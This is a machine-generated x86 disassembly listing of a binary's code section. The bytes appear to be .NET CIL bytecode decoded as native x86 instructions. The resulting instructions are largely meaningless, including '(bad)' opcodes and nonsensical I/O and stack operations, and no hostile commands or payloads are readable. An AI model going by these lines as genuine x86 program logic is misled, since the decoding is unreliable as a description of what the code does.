  402af1:	04 02                	add    $0x2,%al
  402af3:	7b 11                	jnp    0x402b06
  402af5:	00 00                	add    %al,(%eax)
  402af7:	04 6f                	add    $0x6f,%al
  402af9:	5f                   	pop    %edi
  402afa:	00 00                	add    %al,(%eax)
  402afc:	0a 00                	or     (%eax),%al
  402afe:	02 7b 10             	add    0x10(%ebx),%bh
  402b01:	00 00                	add    %al,(%eax)
  402b03:	04 6f                	add    $0x6f,%al
  402b05:	60                   	pusha
  402b06:	00 00                	add    %al,(%eax)
  402b08:	0a 00                	or     (%eax),%al
  402b0a:	00 02                	add    %al,(%edx)
  402b0c:	7b 10                	jnp    0x402b1e
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	04 6f                	add    $0x6f,%al
  402b12:	61                   	popa
  402b13:	00 00                	add    %al,(%eax)
  402b15:	0a 6f 62             	or     0x62(%edi),%ch
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	0a 0b                	or     (%ebx),%cl
  402b1c:	2b 31                	sub    (%ecx),%esi
  402b1e:	12 01                	adc    (%ecx),%al
  402b20:	28 63 00             	sub    %ah,0x0(%ebx)
  402b23:	00 0a                	add    %cl,(%edx)
  402b25:	0c 00                	or     $0x0,%al
  402b27:	72 75                	jb     0x402b9e
  402b29:	3c 00                	cmp    $0x0,%al
  402b2b:	70 08                	jo     0x402b35
  402b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2e:	64 00 00             	add    %al,%fs:(%eax)
  402b31:	0a 6f 65             	or     0x65(%edi),%ch
  402b34:	00 00                	add    %al,(%eax)
  402b36:	0a 08                	or     (%eax),%cl
  402b38:	6f                   	outsl  %ds:(%esi),(%dx)
  402b39:	66 00 00             	data16 add %al,(%eax)
  402b3c:	0a 08                	or     (%eax),%cl
  402b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3f:	67 00 00             	add    %al,(%bx,%si)
  402b42:	0a 8c 58 00 00 01 28 	or     0x28010000(%eax,%ebx,2),%cl
  402b49:	68 00 00 0a 00       	push   $0xa0000
  402b4e:	00 12                	add    %dl,(%edx)
  402b50:	01 28                	add    %ebp,(%eax)
  402b52:	69 00 00 0a 2d c6    	imul   $0xc62d0a00,(%eax),%eax
  402b58:	de 0f                	fimuls (%edi)
  402b5a:	12 01                	adc    (%ecx),%al
  402b5c:	fe                   	(bad)
  402b5d:	16                   	push   %ss
  402b5e:	06                   	push   %es
  402b5f:	00 00                	add    %al,(%eax)
  402b61:	1b 6f 21             	sbb    0x21(%edi),%ebp
  402b64:	00 00                	add    %al,(%eax)
  402b66:	0a 00                	or     (%eax),%al
  402b68:	dc 02                	faddl  (%edx)
  402b6a:	7b 12                	jnp    0x402b7e
  402b6c:	00 00                	add    %al,(%eax)
  402b6e:	04 72                	add    $0x72,%al
  402b70:	df 3c 00             	fistpll (%eax,%eax,1)
  402b73:	70 03                	jo     0x402b78
  402b75:	02 7b 22             	add    0x22(%ebx),%bh
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	04 14                	add    $0x14,%al
  402b7c:	fe 03                	incb   (%ebx)
  402b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b7f:	0c 00                	or     $0x0,%al
  402b81:	00 06                	add    %al,(%esi)
  402b83:	00 2a                	add    %ch,(%edx)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	00 01                	add    %al,(%ecx)
  402b89:	10 00                	adc    %al,(%eax)
  402b8b:	00 02                	add    %al,(%edx)
  402b8d:	00 ac 00 3e ea 00 0f 	add    %ch,0xf00ea3e(%eax,%eax,1)
  402b94:	00 00                	add    %al,(%eax)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	13 30                	adc    (%eax),%esi
  402b9a:	03 00                	add    (%eax),%eax
  402b9c:	62 00                	bound  %eax,(%eax)
  402b9e:	00 00                	add    %al,(%eax)
  402ba0:	00 00                	add    %al,(%eax)
  402ba2:	00 00                	add    %al,(%eax)
  402ba4:	00 02                	add    %al,(%edx)
  402ba6:	7b 11                	jnp    0x402bb9
  402ba8:	00 00                	add    %al,(%eax)
  402baa:	04 02                	add    $0x2,%al
  402bac:	fe 06                	incb   (%esi)
  402bae:	1a 00                	sbb    (%eax),%al
  402bb0:	00 06                	add    %al,(%esi)
  402bb2:	73 5c                	jae    0x402c10
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	0a 6f 6a             	or     0x6a(%edi),%ch
  402bb9:	00 00                	add    %al,(%eax)
  402bbb:	0a 00                	or     (%eax),%al
  402bbd:	02 7b 10             	add    0x10(%ebx),%bh
  402bc0:	00 00                	add    %al,(%eax)
  402bc2:	04 02                	add    $0x2,%al
  402bc4:	fe 06                	incb   (%esi)
  402bc6:	1b 00                	sbb    (%eax),%eax
  402bc8:	00 06                	add    %al,(%esi)
  402bca:	73 57                	jae    0x402c23
  402bcc:	00 00                	add    %al,(%eax)
  402bce:	0a 6f 6b             	or     0x6b(%edi),%ch
  402bd1:	00 00                	add    %al,(%eax)
  402bd3:	0a 00                	or     (%eax),%al
  402bd5:	02 7b 10             	add    0x10(%ebx),%bh
  402bd8:	00 00                	add    %al,(%eax)
  402bda:	04 02                	add    $0x2,%al
  402bdc:	fe 06                	incb   (%esi)
  402bde:	1c 00                	sbb    $0x0,%al
  402be0:	00 06                	add    %al,(%esi)
  402be2:	73 57                	jae    0x402c3b
  402be4:	00 00                	add    %al,(%eax)
  402be6:	0a 6f 6c             	or     0x6c(%edi),%ch
  402be9:	00 00                	add    %al,(%eax)
  402beb:	0a 00                	or     (%eax),%al
  402bed:	02 7b 10             	add    0x10(%ebx),%bh
  402bf0:	00 00                	add    %al,(%eax)
  402bf2:	04 6f                	add    $0x6f,%al
  402bf4:	6d                   	insl   (%dx),%es:(%edi)
  402bf5:	00 00                	add    %al,(%eax)
  402bf7:	0a 00                	or     (%eax),%al
  402bf9:	02 7b 12             	add    0x12(%ebx),%bh
  402bfc:	00 00                	add    %al,(%eax)
  402bfe:	04 6f                	add    $0x6f,%al
  402c00:	0d 00 00 06 00       	or     $0x60000,%eax
  402c05:	2a 26                	sub    (%esi),%ah
  402c07:	00 02                	add    %al,(%edx)
  402c09:	28 18                	sub    %bl,(%eax)
  402c0b:	00 00                	add    %al,(%eax)
  402c0d:	06                   	push   %es
  402c0e:	00 2a                	add    %ch,(%edx)
  402c10:	13 30                	adc    (%eax),%esi
  402c12:	02 00                	add    (%eax),%al
  402c14:	46                   	inc    %esi
  402c15:	00 00                	add    %al,(%eax)
  402c17:	00 08                	add    %cl,(%eax)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	11 73 32             	adc    %esi,0x32(%ebx)
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	06                   	push   %es
  402c21:	0a 06                	or     (%esi),%al
  402c23:	28 6e 00             	sub    %ch,0x0(%esi)
  402c26:	00 0a                	add    %cl,(%edx)
  402c28:	7d 39                	jge    0x402c63
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	04 06                	add    $0x6,%al
  402c2e:	02 7d 3c             	add    0x3c(%ebp),%bh
  402c31:	00 00                	add    %al,(%eax)
  402c33:	04 06                	add    $0x6,%al
  402c35:	03 7d 3a             	add    0x3a(%ebp),%edi
  402c38:	00 00                	add    %al,(%eax)
  402c3a:	04 06                	add    $0x6,%al
  402c3c:	04 7d                	add    $0x7d,%al
  402c3e:	3b 00                	cmp    (%eax),%eax
  402c40:	00 04 06             	add    %al,(%esi,%eax,1)
  402c43:	15 7d 38 00 00       	adc    $0x387d,%eax
  402c48:	04 06                	add    $0x6,%al
  402c4a:	7c 39                	jl     0x402c85
  402c4c:	00 00                	add    %al,(%eax)
  402c4e:	04 12                	add    $0x12,%al
  402c50:	00 28                	add    %ch,(%eax)
  402c52:	04 00                	add    $0x0,%al
  402c54:	00 2b                	add    %ch,(%ebx)
  402c56:	06                   	push   %es
  402c57:	7c 39                	jl     0x402c92
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	04 28                	add    $0x28,%al
  402c5d:	70 00                	jo     0x402c5f
  402c5f:	00 0a                	add    %cl,(%edx)
  402c61:	2a 00                	sub    (%eax),%al
  402c63:	00 13                	add    %dl,(%ebx)
  402c65:	30 02                	xor    %al,(%edx)
  402c67:	00 46 00             	add    %al,0x0(%esi)
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	09 00                	or     %eax,(%eax)
  402c6e:	00 11                	add    %dl,(%ecx)
  402c70:	73 35                	jae    0x402ca7
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	0a 06                	or     (%esi),%al
  402c77:	28 6e 00             	sub    %ch,0x0(%esi)
  402c7a:	00 0a                	add    %cl,(%edx)
  402c7c:	7d 41                	jge    0x402cbf
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	04 06                	add    $0x6,%al
  402c82:	02 7d 44             	add    0x44(%ebp),%bh
  402c85:	00 00                	add    %al,(%eax)
  402c87:	04 06                	add    $0x6,%al
  402c89:	03 7d 42             	add    0x42(%ebp),%edi
  402c8c:	00 00                	add    %al,(%eax)
  402c8e:	04 06                	add    $0x6,%al
  402c90:	04 7d                	add    $0x7d,%al
  402c92:	43                   	inc    %ebx
  402c93:	00 00                	add    %al,(%eax)
  402c95:	04 06                	add    $0x6,%al
  402c97:	15 7d 40 00 00       	adc    $0x407d,%eax
  402c9c:	04 06                	add    $0x6,%al
  402c9e:	7c 41                	jl     0x402ce1
  402ca0:	00 00                	add    %al,(%eax)
  402ca2:	04 12                	add    $0x12,%al
  402ca4:	00 28                	add    %ch,(%eax)
  402ca6:	05 00 00 2b 06       	add    $0x62b0000,%eax
  402cab:	7c 41                	jl     0x402cee
  402cad:	00 00                	add    %al,(%eax)
  402caf:	04 28                	add    $0x28,%al
  402cb1:	70 00                	jo     0x402cb3
  402cb3:	00 0a                	add    %cl,(%edx)
  402cb5:	2a 00                	sub    (%eax),%al
  402cb7:	00 13                	add    %dl,(%ebx)
  402cb9:	30 02                	xor    %al,(%edx)
  402cbb:	00 46 00             	add    %al,0x0(%esi)
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	0a 00                	or     (%eax),%al
  402cc2:	00 11                	add    %dl,(%ecx)
  402cc4:	73 38                	jae    0x402cfe
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	0a 06                	or     (%esi),%al
  402ccb:	28 6e 00             	sub    %ch,0x0(%esi)
  402cce:	00 0a                	add    %cl,(%edx)
  402cd0:	7d 4c                	jge    0x402d1e
  402cd2:	00 00                	add    %al,(%eax)
  402cd4:	04 06                	add    $0x6,%al
  402cd6:	02 7d 4f             	add    0x4f(%ebp),%bh
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	04 06                	add    $0x6,%al
  402cdd:	03 7d 4d             	add    0x4d(%ebp),%edi
  402ce0:	00 00                	add    %al,(%eax)
  402ce2:	04 06                	add    $0x6,%al
  402ce4:	04 7d                	add    $0x7d,%al
  402ce6:	4e                   	dec    %esi
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	04 06                	add    $0x6,%al
  402ceb:	15 7d 4b 00 00       	adc    $0x4b7d,%eax
  402cf0:	04 06                	add    $0x6,%al
  402cf2:	7c 4c                	jl     0x402d40
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	04 12                	add    $0x12,%al
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	06                   	push   %es
  402cfb:	00 00                	add    %al,(%eax)
  402cfd:	2b 06                	sub    (%esi),%eax
  402cff:	7c 4c                	jl     0x402d4d
  402d01:	00 00                	add    %al,(%eax)
  402d03:	04 28                	add    $0x28,%al
  402d05:	70 00                	jo     0x402d07
  402d07:	00 0a                	add    %cl,(%edx)
  402d09:	2a 00                	sub    (%eax),%al
  402d0b:	00 13                	add    %dl,(%ebx)
  402d0d:	30 02                	xor    %al,(%edx)
  402d0f:	00 46 00             	add    %al,0x0(%esi)
  402d12:	00 00                	add    %al,(%eax)
  402d14:	0b 00                	or     (%eax),%eax
  402d16:	00 11                	add    %dl,(%ecx)
  402d18:	73 3b                	jae    0x402d55
  402d1a:	00 00                	add    %al,(%eax)
  402d1c:	06                   	push   %es
  402d1d:	0a 06                	or     (%esi),%al
  402d1f:	28 6e 00             	sub    %ch,0x0(%esi)
  402d22:	00 0a                	add    %cl,(%edx)
  402d24:	7d 60                	jge    0x402d86
  402d26:	00 00                	add    %al,(%eax)
  402d28:	04 06                	add    $0x6,%al
  402d2a:	02 7d 63             	add    0x63(%ebp),%bh
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	04 06                	add    $0x6,%al
  402d31:	03 7d 61             	add    0x61(%ebp),%edi
  402d34:	00 00                	add    %al,(%eax)
  402d36:	04 06                	add    $0x6,%al
  402d38:	04 7d                	add    $0x7d,%al
  402d3a:	62 00                	bound  %eax,(%eax)
  402d3c:	00 04 06             	add    %al,(%esi,%eax,1)
  402d3f:	15 7d 5f 00 00       	adc    $0x5f7d,%eax
  402d44:	04 06                	add    $0x6,%al
  402d46:	7c 60                	jl     0x402da8
  402d48:	00 00                	add    %al,(%eax)
  402d4a:	04 12                	add    $0x12,%al
  402d4c:	00 28                	add    %ch,(%eax)
  402d4e:	07                   	pop    %es
  402d4f:	00 00                	add    %al,(%eax)
  402d51:	2b 06                	sub    (%esi),%eax
  402d53:	7c 60                	jl     0x402db5
  402d55:	00 00                	add    %al,(%eax)
  402d57:	04 28                	add    $0x28,%al
  402d59:	70 00                	jo     0x402d5b
  402d5b:	00 0a                	add    %cl,(%edx)
  402d5d:	2a 00                	sub    (%eax),%al
  402d5f:	00 13                	add    %dl,(%ebx)
  402d61:	30 02                	xor    %al,(%edx)
  402d63:	00 46 00             	add    %al,0x0(%esi)
  402d66:	00 00                	add    %al,(%eax)
  402d68:	0c 00                	or     $0x0,%al
  402d6a:	00 11                	add    %dl,(%ecx)
  402d6c:	73 3e                	jae    0x402dac
  402d6e:	00 00                	add    %al,(%eax)
  402d70:	06                   	push   %es
  402d71:	0a 06                	or     (%esi),%al
  402d73:	28 6e 00             	sub    %ch,0x0(%esi)
  402d76:	00 0a                	add    %cl,(%edx)
  402d78:	7d 66                	jge    0x402de0
  402d7a:	00 00                	add    %al,(%eax)
  402d7c:	04 06                	add    $0x6,%al
  402d7e:	02 7d 69             	add    0x69(%ebp),%bh
  402d81:	00 00                	add    %al,(%eax)
  402d83:	04 06                	add    $0x6,%al
  402d85:	03 7d 67             	add    0x67(%ebp),%edi
  402d88:	00 00                	add    %al,(%eax)
  402d8a:	04 06                	add    $0x6,%al
  402d8c:	04 7d                	add    $0x7d,%al
  402d8e:	68 00 00 04 06       	push   $0x6040000
  402d93:	15 7d 65 00 00       	adc    $0x657d,%eax
  402d98:	04 06                	add    $0x6,%al
  402d9a:	7c 66                	jl     0x402e02
  402d9c:	00 00                	add    %al,(%eax)
  402d9e:	04 12                	add    $0x12,%al
  402da0:	00 28                	add    %ch,(%eax)
  402da2:	08 00                	or     %al,(%eax)
  402da4:	00 2b                	add    %ch,(%ebx)
  402da6:	06                   	push   %es
  402da7:	7c 66                	jl     0x402e0f
  402da9:	00 00                	add    %al,(%eax)
  402dab:	04 28                	add    $0x28,%al
  402dad:	70 00                	jo     0x402daf
  402daf:	00 0a                	add    %cl,(%edx)
  402db1:	2a 00                	sub    (%eax),%al
  402db3:	00 13                	add    %dl,(%ebx)
  402db5:	30 02                	xor    %al,(%edx)
  402db7:	00 34 00             	add    %dh,(%eax,%eax,1)
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	0d 00 00 11 73       	or     $0x73110000,%eax
  402dc1:	2c 00                	sub    $0x0,%al
  402dc3:	00 06                	add    %al,(%esi)
  402dc5:	0a 06                	or     (%esi),%al
  402dc7:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402dcb:	0a 7d 31             	or     0x31(%ebp),%bh
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	04 06                	add    $0x6,%al
  402dd2:	02 7d 33             	add    0x33(%ebp),%bh
  402dd5:	00 00                	add    %al,(%eax)
  402dd7:	04 06                	add    $0x6,%al
  402dd9:	03 7d 32             	add    0x32(%ebp),%edi
  402ddc:	00 00                	add    %al,(%eax)
  402dde:	04 06                	add    $0x6,%al
  402de0:	15 7d 30 00 00       	adc    $0x307d,%eax
  402de5:	04 06                	add    $0x6,%al
  402de7:	7c 31                	jl     0x402e1a
  402de9:	00 00                	add    %al,(%eax)
  402deb:	04 12                	add    $0x12,%al
  402ded:	00 28                	add    %ch,(%eax)
  402def:	09 00                	or     %eax,(%eax)
  402df1:	00 2b                	add    %ch,(%ebx)
  402df3:	2a 13                	sub    (%ebx),%dl
  402df5:	30 08                	xor    %cl,(%eax)
  402df7:	00 59 00             	add    %bl,0x0(%ecx)
  402dfa:	00 00                	add    %al,(%eax)
  402dfc:	0e                   	push   %cs
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	11 00                	adc    %eax,(%eax)
  402e01:	14 72                	adc    $0x72,%al
  402e03:	f3 3c 00             	repz cmp $0x0,%al
  402e06:	70 02                	jo     0x402e0a
  402e08:	28 71 00             	sub    %dh,0x0(%ecx)
  402e0b:	00 0a                	add    %cl,(%edx)
  402e0d:	72 f3                	jb     0x402e02
  402e0f:	3c 00                	cmp    $0x0,%al
  402e11:	70 02                	jo     0x402e15
  402e13:	28 71 00             	sub    %dh,0x0(%ecx)
  402e16:	00 0a                	add    %cl,(%edx)
  402e18:	28 72 00             	sub    %dh,0x0(%edx)
  402e1b:	00 0a                	add    %cl,(%edx)
  402e1d:	0a 12                	or     (%edx),%dl
  402e1f:	00 23                	add    %ah,(%ebx)
  402e21:	00 00                	add    %al,(%eax)
  402e23:	00 00                	add    %al,(%eax)
  402e25:	00 e0                	add    %ah,%al
  402e27:	76 c0                	jbe    0x402de9
  402e29:	28 73 00             	sub    %dh,0x0(%ebx)
  402e2c:	00 0a                	add    %cl,(%edx)
  402e2e:	28 72 00             	sub    %dh,0x0(%edx)
  402e31:	00 0a                	add    %cl,(%edx)
  402e33:	0a 12                	or     (%edx),%dl
  402e35:	00 23                	add    %ah,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	00 e0                	add    %ah,%al
  402e3d:	76 40                	jbe    0x402e7f
  402e3f:	28 73 00             	sub    %dh,0x0(%ebx)
  402e42:	00 0a                	add    %cl,(%edx)
  402e44:	20 00                	and    %al,(%eax)
  402e46:	08 00                	or     %al,(%eax)
  402e48:	00 72 fb             	add    %dh,-0x5(%edx)
  402e4b:	3c 00                	cmp    $0x0,%al
  402e4d:	70 14                	jo     0x402e63
  402e4f:	28 23                	sub    %ah,(%ebx)
  402e51:	00 00                	add    %al,(%eax)
  402e53:	06                   	push   %es
  402e54:	0b 2b                	or     (%ebx),%ebp
  402e56:	00 07                	add    %al,(%edi)
  402e58:	2a 00                	sub    (%eax),%al
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	13 30                	adc    (%eax),%esi
  402e5e:	02 00                	add    (%eax),%al
  402e60:	21 00                	and    %eax,(%eax)
  402e62:	00 00                	add    %al,(%eax)
  402e64:	0f 00 00             	sldt   (%eax)
  402e67:	11 00                	adc    %eax,(%eax)
  402e69:	1c 17                	sbb    $0x17,%al
  402e6b:	73 74                	jae    0x402ee1
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	0a 0a                	or     (%edx),%cl
  402e71:	06                   	push   %es
  402e72:	17                   	pop    %ss
  402e73:	6f                   	outsl  %ds:(%esi),(%dx)
  402e74:	75 00                	jne    0x402e76
  402e76:	00 0a                	add    %cl,(%edx)
  402e78:	00 06                	add    %al,(%esi)
  402e7a:	02 6f 76             	add    0x76(%edi),%ch
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	0a 00                	or     (%eax),%al
  402e81:	06                   	push   %es
  402e82:	6f                   	outsl  %ds:(%esi),(%dx)
  402e83:	77 00                	ja     0x402e85
  402e85:	00 0a                	add    %cl,(%edx)
  402e87:	00 2a                	add    %ch,(%edx)
  402e89:	00 00                	add    %al,(%eax)
  402e8b:	00 13                	add    %dl,(%ebx)
  402e8d:	30 02                	xor    %al,(%edx)
  402e8f:	00 21                	add    %ah,(%ecx)
  402e91:	00 00                	add    %al,(%eax)
  402e93:	00 0f                	add    %cl,(%edi)
  402e95:	00 00                	add    %al,(%eax)
  402e97:	11 00                	adc    %eax,(%eax)
  402e99:	1c 17                	sbb    $0x17,%al
  402e9b:	73 74                	jae    0x402f11
  402e9d:	00 00                	add    %al,(%eax)
  402e9f:	0a 0a                	or     (%edx),%cl
  402ea1:	06                   	push   %es
  402ea2:	17                   	pop    %ss
  402ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea4:	75 00                	jne    0x402ea6
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	00 06                	add    %al,(%esi)
  402eaa:	02 6f 78             	add    0x78(%edi),%ch
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	0a 00                	or     (%eax),%al
  402eb1:	06                   	push   %es
  402eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb3:	77 00                	ja     0x402eb5
  402eb5:	00 0a                	add    %cl,(%edx)
  402eb7:	00 2a                	add    %ch,(%edx)
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	00 13                	add    %dl,(%ebx)
  402ebd:	30 08                	xor    %cl,(%eax)
  402ebf:	00 e3                	add    %ah,%bl
  402ec1:	01 00                	add    %eax,(%eax)
  402ec3:	00 10                	add    %dl,(%eax)
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	11 00                	adc    %eax,(%eax)
  402ec9:	73 79                	jae    0x402f44
  402ecb:	00 00                	add    %al,(%eax)
  402ecd:	0a 0a                	or     (%edx),%cl
  402ecf:	06                   	push   %es
  402ed0:	73 7a                	jae    0x402f4c
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	0a 0b                	or     (%ebx),%cl
  402ed6:	73 7b                	jae    0x402f53
  402ed8:	00 00                	add    %al,(%eax)
  402eda:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  402edd:	7c 00                	jl     0x402edf
  402edf:	00 0a                	add    %cl,(%edx)
  402ee1:	21 ff                	and    %edi,%edi
  402ee3:	ff                   	(bad)
  402ee4:	ff                   	(bad)
  402ee5:	ff                   	(bad)
  402ee6:	ff                   	(bad)
  402ee7:	ff                   	(bad)
  402ee8:	ff                   	(bad)
  402ee9:	7f 28                	jg     0x402f13
  402eeb:	7d 00                	jge    0x402eed
  402eed:	00 0a                	add    %cl,(%edx)
  402eef:	07                   	pop    %es
  402ef0:	28 7e 00             	sub    %bh,0x0(%esi)
  402ef3:	00 0a                	add    %cl,(%edx)
  402ef5:	0d 08 09 6f 7f       	or     $0x7f6f0908,%eax
  402efa:	00 00                	add    %al,(%eax)
  402efc:	0a 00                	or     (%eax),%al
  402efe:	03 73 80             	add    -0x80(%ebx),%esi
  402f01:	00 00                	add    %al,(%eax)
  402f03:	0a 13                	or     (%ebx),%dl
  402f05:	04 04                	add    $0x4,%al
  402f07:	73 80                	jae    0x402e89
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a 13                	or     (%ebx),%dl
  402f0d:	05 08 11 05 6f       	add    $0x6f051108,%eax
  402f12:	81 00 00 0a 00 08    	addl   $0x8000a00,(%eax)
  402f18:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402f1b:	82 00 00             	addb   $0x0,(%eax)
  402f1e:	0a 00                	or     (%eax),%al
  402f20:	08 05 6f 83 00 00    	or     %al,0x836f
  402f26:	0a 00                	or     (%eax),%al
  402f28:	08 0e                	or     %cl,(%esi)
  402f2a:	04 6f                	add    $0x6f,%al
  402f2c:	84 00                	test   %al,(%eax)
  402f2e:	00 0a                	add    %cl,(%edx)
  402f30:	00 02                	add    %al,(%edx)
  402f32:	14 fe                	adc    $0xfe,%al
  402f34:	03 13                	add    (%ebx),%edx
  402f36:	10 11                	adc    %dl,(%ecx)
  402f38:	10 2c 31             	adc    %ch,(%ecx,%esi,1)
  402f3b:	00 17                	add    %dl,(%edi)
  402f3d:	8d 4e 00             	lea    0x0(%esi),%ecx
  402f40:	00 01                	add    %al,(%ecx)
  402f42:	25 16 18 02 73       	and    $0x73021816,%eax
  402f47:	85 00                	test   %eax,(%eax)
  402f49:	00 0a                	add    %cl,(%edx)
  402f4b:	a2 13 11 11 11       	mov    %al,0x11111113
  402f50:	73 86                	jae    0x402ed8
  402f52:	00 00                	add    %al,(%eax)
  402f54:	0a 13                	or     (%ebx),%dl
  402f56:	12 08                	adc    (%eax),%cl
  402f58:	7e 87                	jle    0x402ee1
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	0a 6f 88             	or     -0x78(%edi),%ch
  402f5f:	00 00                	add    %al,(%eax)
  402f61:	0a 16                	or     (%esi),%dl
  402f63:	11 12                	adc    %edx,(%edx)
  402f65:	6f                   	outsl  %ds:(%esi),(%dx)
  402f66:	89 00                	mov    %eax,(%eax)
  402f68:	00 0a                	add    %cl,(%edx)
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	07                   	pop    %es
  402f6d:	0e                   	push   %cs
  402f6e:	05 73 8a 00 00       	add    $0x8a73,%eax
  402f73:	0a 13                	or     (%ebx),%dl
  402f75:	06                   	push   %es
  402f76:	73 8b                	jae    0x402f03
  402f78:	00 00                	add    %al,(%eax)
  402f7a:	0a 13                	or     (%ebx),%dl
  402f7c:	07                   	pop    %es
  402f7d:	11 07                	adc    %eax,(%edi)
  402f7f:	11 06                	adc    %eax,(%esi)
  402f81:	6f                   	outsl  %ds:(%esi),(%dx)
  402f82:	8c 00                	mov    %es,(%eax)
  402f84:	00 0a                	add    %cl,(%edx)
  402f86:	00 11                	add    %dl,(%ecx)
  402f88:	07                   	pop    %es
  402f89:	6f                   	outsl  %ds:(%esi),(%dx)
  402f8a:	8d 00                	lea    (%eax),%eax
  402f8c:	00 0a                	add    %cl,(%edx)
  402f8e:	13 08                	adc    (%eax),%ecx
  402f90:	08 11                	or     %dl,(%ecx)
  402f92:	08 6f 8e             	or     %ch,-0x72(%edi)
  402f95:	00 00                	add    %al,(%eax)
  402f97:	0a 6f 8f             	or     -0x71(%edi),%ch
  402f9a:	00 00                	add    %al,(%eax)
  402f9c:	0a 00                	or     (%eax),%al
  402f9e:	08 7e 90             	or     %bh,-0x70(%esi)
  402fa1:	00 00                	add    %al,(%eax)
  402fa3:	0a 6f 88             	or     -0x78(%edi),%ch
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	0a 16                	or     (%esi),%dl
  402faa:	17                   	pop    %ss
  402fab:	8d 70 00             	lea    0x0(%eax),%esi
  402fae:	00 01                	add    %al,(%ecx)
  402fb0:	25 16 7e 91 00       	and    $0x917e16,%eax
  402fb5:	00 0a                	add    %cl,(%edx)
  402fb7:	a2 73 92 00 00       	mov    %al,0x9273
  402fbc:	0a 6f 89             	or     -0x77(%edi),%ch
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 00                	or     (%eax),%al
  402fc3:	0e                   	push   %cs
  402fc4:	07                   	pop    %es
  402fc5:	14 fe                	adc    $0xfe,%al
  402fc7:	01 13                	add    %edx,(%ebx)
  402fc9:	13 11                	adc    (%ecx),%edx
  402fcb:	13 2c 1a             	adc    (%edx,%ebx,1),%ebp
  402fce:	00 08                	add    %cl,(%eax)
  402fd0:	7e 93                	jle    0x402f65
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 6f 88             	or     -0x78(%edi),%ch
  402fd7:	00 00                	add    %al,(%eax)
  402fd9:	0a 17                	or     (%edi),%dl
  402fdb:	17                   	pop    %ss
  402fdc:	73 94                	jae    0x402f72
  402fde:	00 00                	add    %al,(%eax)
  402fe0:	0a 6f 89             	or     -0x77(%edi),%ch
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	0a 00                	or     (%eax),%al
  402fe7:	00 0e                	add    %cl,(%esi)
  402fe9:	06                   	push   %es
  402fea:	0e                   	push   %cs
  402feb:	07                   	pop    %es
  402fec:	25 2d 08 26 11       	and    $0x1126082d,%eax
  402ff1:	08 6f 95             	or     %ch,-0x6b(%edi)
  402ff4:	00 00                	add    %al,(%eax)
  402ff6:	0a 07                	or     (%edi),%al
  402ff8:	73 96                	jae    0x402f90
  402ffa:	00 00                	add    %al,(%eax)
  402ffc:	0a 13                	or     (%ebx),%dl
  402ffe:	09 08                	or     %ecx,(%eax)
  403000:	11 09                	adc    %ecx,(%ecx)
  403002:	6f                   	outsl  %ds:(%esi),(%dx)
  403003:	97                   	xchg   %eax,%edi
  403004:	00 00                	add    %al,(%eax)
  403006:	0a 13                	or     (%ebx),%dl
  403008:	0a 11                	or     (%ecx),%dl
  40300a:	08 6f 95             	or     %ch,-0x6b(%edi)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	0a 28                	or     (%eax),%ch
  403011:	98                   	cwtl
  403012:	00 00                	add    %al,(%eax)
  403014:	0a 13                	or     (%ebx),%dl
  403016:	0b 11                	or     (%ecx),%edx
  403018:	0b 6f 99             	or     -0x67(%edi),%ebp
  40301b:	00 00                	add    %al,(%eax)
  40301d:	0a 6f 9a             	or     -0x66(%edi),%ch
  403020:	00 00                	add    %al,(%eax)
  403022:	0a 28                	or     (%eax),%ch
  403024:	9b                   	fwait
  403025:	00 00                	add    %al,(%eax)
  403027:	0a 74 4b 00          	or     0x0(%ebx,%ecx,2),%dh
  40302b:	00 01                	add    %al,(%ecx)
  40302d:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403030:	0c 6f                	or     $0x6f,%al
  403032:	9c                   	pushf
  403033:	00 00                	add    %al,(%eax)
  403035:	0a 1f                	or     (%edi),%bl
  403037:	09 fe                	or     %edi,%esi
